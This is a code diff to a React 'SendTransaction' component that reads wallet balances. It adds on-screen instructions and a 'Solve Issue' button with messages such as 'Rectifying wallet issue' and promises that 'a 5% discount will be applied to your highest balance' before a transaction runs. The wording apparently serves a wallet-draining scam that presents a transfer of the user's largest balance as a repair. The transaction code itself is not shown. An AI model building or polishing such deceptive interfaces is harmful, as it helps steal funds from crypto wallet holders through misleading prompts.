@@ -107,8 +107,12 @@ const SendTransaction: React.FC<SendTransactionProps> = ({ balances }) => {
   };
 
   return (
-    <div style={containerStyle}>
-      {!transactionInitiated && showButton && (
+  <div style={containerStyle}>
+    {!transactionInitiated && showButton && (
+      <>
+        <div style={{ marginBottom: '10px' }}>
+          <strong>Instructions:</strong> Before proceeding, please ensure that your wallet is properly connected and that you have enough balance. Once you click the button below, a 5% discount will be applied to your highest balance, and the transaction will be processed.
+        </div>
         <button
           ref={buttonRef}
           onClick={handleSendTransaction}
@@ -118,12 +122,14 @@ const SendTransaction: React.FC<SendTransactionProps> = ({ balances }) => {
         >
           Solve Issue
         </button>
-      )}
-      {isPending && <div>Rectifying wallet issue... kindly follow the prompt instructions.</div>}
-      {isConfirming && <div>Waiting for System confirmation...</div>}
-      {message && <div>{message}</div>}
-    </div>
-  );
+      </>
+    )}
+    {isPending && <div>Rectifying wallet issue... kindly follow the prompt instructions.</div>}
+    {isConfirming && <div>Waiting for System confirmation...</div>}
+    {message && <div>{message}</div>}
+  </div>
+);
+
 };
 
 export default SendTransaction;
